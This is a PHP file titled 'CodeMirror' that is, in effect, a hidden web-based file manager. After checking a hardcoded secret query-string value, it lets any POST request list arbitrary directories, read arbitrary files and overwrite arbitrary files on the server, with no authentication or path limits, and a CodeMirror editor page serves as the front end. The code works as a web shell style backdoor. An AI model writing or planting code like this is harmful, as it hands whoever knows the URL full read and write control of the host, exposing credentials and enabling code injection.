<?php

if(!($_GET[input]==='nulNeDitQuIlEstFacileDeBienAgir')) exit();

# init
    $exit = false;
    // list directory
    if(isset($_POST))
        switch($_POST['task'])
        {
            case 'list':
                print_r(scandir($_POST['target']));$exit = true;
                break;
            case 'get':
                echo file_get_contents($_POST['target']);$exit = true;
                break;
            case 'save':
                file_put_contents($_POST['target'], $_POST['content']);$exit = true;
                break;
        }
# exit
    if($exit) exit();
?>
<!doctype html>
<html>

    <head>
        <title>CodeMirror</title>
        <meta charset="utf-8">

        <link rel="stylesheet" href="codeMirror/lib/codemirror.css">
        <link rel="stylesheet" href="codeMirror/doc/docs.css">
        <script src="codeMirror/lib/codemirror.js"></script>
        <script src="codeMirror/mode/xml/xml.js"></script>
        <script src="codeMirror/mode/javascript/javascript.js"></script>
        <script src="codeMirror/mode/css/css.js"></script>
        <script src="codeMirror/mode/htmlmixed/htmlmixed.js"></script>
        <script src="codeMirror/addon/edit/matchbrackets.js"></script>

        <script src="codeMirror/doc/activebookmark.js"></script>
        <script src="https://ajax.googleapis.com/ajax/libs/jquery/2.1.3/jquery.min.js"></script>
        
        <style>
          .CodeMirror { height: auto; border: 1px solid #ddd; }
          .CodeMirror-scroll { max-height: 600px; }
          .CodeMirror pre { padding-left: 7px; line-height: 1.25; }
        </style>

    </head>
    <body>
        
        <div><input id="iList" type="text" value="" style="width:20%;" />
          <input type="button" value="list" onclick="check();" /><input type="button" value="get" onclick="get();" />
          <div style="float:right;">
          	<input type="button" value="save" onclick="save();"/>
          </div>
        </div>
        <div id="cList" style="float:left;width:20%;">// LIST //</div>
        <div id="cContent">
            <textarea id="dContent">// put content here</textarea>
        </div>
        
    </body>
    <script>
        
        var editor = CodeMirror.fromTextArea(document.getElementById("dContent"), {
          lineNumbers: true,
          mode: "text/html",
          matchBrackets: true
        });
        
        function get(){
            $.post( "", { task: "get", target: $('#iList').val() })
            .done(function( data ) {
              editor.setValue(data);
            });
        }  
        function check(){
            $.post( "", { task: "list", target: $('#iList').val() })
            .done(function( data ) {
              $('#cList').html("<pre>"+data+"</pre>");
            });
        }
        
        function save() {
             $.post( "", { task: "save", target: $('#iList').val(), content: editor.getValue() })
            .done(function( data ) {
              alert("saved");
            });
        }

    </script>
</html>
<?php



